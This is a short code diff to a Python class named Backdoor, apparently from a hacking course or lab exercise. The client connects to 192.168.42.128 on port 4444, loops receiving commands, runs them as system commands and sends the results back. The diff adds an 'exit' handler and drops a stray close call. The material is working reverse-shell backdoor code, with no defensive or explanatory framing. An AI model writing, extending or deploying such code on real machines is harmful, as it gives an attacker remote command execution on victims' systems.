@@ -28,10 +28,11 @@ class Backdoor:
     def run(self):
         while True:
             command = self.realiable_receive()
+            if command[0] == "exit":
+              self.connection.close()
+              exit()
             command_result = self.execute_system_command(command)
             self.reliable_send(command_result)
-
-        connection.close
 
 my_backdoor = Backdoor("192.168.42.128", 4444)
 my_backdoor.run()
